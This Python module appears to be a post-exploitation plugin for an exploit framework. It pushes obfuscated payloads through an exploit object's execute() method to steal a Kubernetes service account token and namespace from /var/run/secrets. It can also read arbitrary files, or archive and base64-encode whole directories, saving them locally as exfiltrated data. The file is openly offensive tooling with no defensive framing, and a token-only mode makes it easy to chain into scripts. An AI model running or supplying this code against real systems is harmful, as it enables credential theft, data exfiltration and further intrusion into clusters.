import ast
import base64
import sys

def run(exploit, param=None):
    # 1. Logic for modes
    mode = "token"
    token_only = False
    file_path = None

    if param:
        if "--token-only" in param:
            token_only = True
            mode = "token"
        elif param.startswith("/"):
            mode = "file/dir"
            file_path = param
        elif "token" in param:
            mode = "token"

    # Only print headers if NOT in token-only mode
    if not token_only:
        print(f"\n[ SYSTEM EXFIL: {mode.upper()} RETRIEVAL ]")

    if mode == "token":
        if not token_only:
            print("[*] Accessing: Kubernetes Service Account Secrets")
        
        exfil_payload = (
            "(lambda: (lambda os: str({p: (open(p).read() if os.path.exists(p) else 'NOT_FOUND') for p in ["
            "'/var/run/secrets/kubernetes.io/serviceaccount/namespace',"
            "'/var/run/secrets/kubernetes.io/serviceaccount/token'"
            "]}))(__import__('os')))()"
        )
    else:
        print(f"[*] Accessing: {file_path}")
        exfil_payload = (
            f"(lambda: (lambda os, tarfile, io, b64: "
            f" (lambda p: (b64.b64encode((lambda b: (lambda t: [t.add(p, arcname=os.path.basename(p)) "
            f" for _ in [0]][0] or t.close() or b.getvalue())(tarfile.open(fileobj=b, mode='w:gz')))"
            f" (io.BytesIO())).decode()) if os.path.isdir(p) else "
            f" (open(p).read() if os.path.exists(p) else 'ERROR: Path not found'))"
            f" ('{file_path}'))(__import__('os'), __import__('tarfile'), __import__('io'), __import__('base64')))()"
        )

    result = exploit.execute(exfil_payload)

    # 2. Minimalist & Script-Friendly Reporting
    try:
        if mode == "token":
            data = ast.literal_eval(result)
            token = data.get('/var/run/secrets/kubernetes.io/serviceaccount/token', '').strip()
            
            if token_only:
                # This is the magic part for scripts
                print(token)
                return 
            
            ns = data.get('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'Unknown').strip()
            print(f"\nNAMESPACE : {ns}")
            print(f"TOKEN     : {token}")
        
        elif result.startswith("H4sI"):
            filename = "exfiltrated_data.tar.gz"
            with open(filename, "wb") as f:
                f.write(base64.b64decode(result))
            print(f"\n[ DIRECTORY DETECTED ]")
            print(f"STATUS    : Compressed & Encoded")
            print(f"SAVED TO  : {filename}")
            
        else:
            print(f"\n--- START CONTENT ---")
            print(result.strip())
            print(f"--- END CONTENT ---\n")
            
    except Exception:
        if not token_only:
            print(f"Error: Retrieval failed. Raw response: {result[:100]}")

    if not token_only:
        print(f"\n[ Exfil Complete ]\n")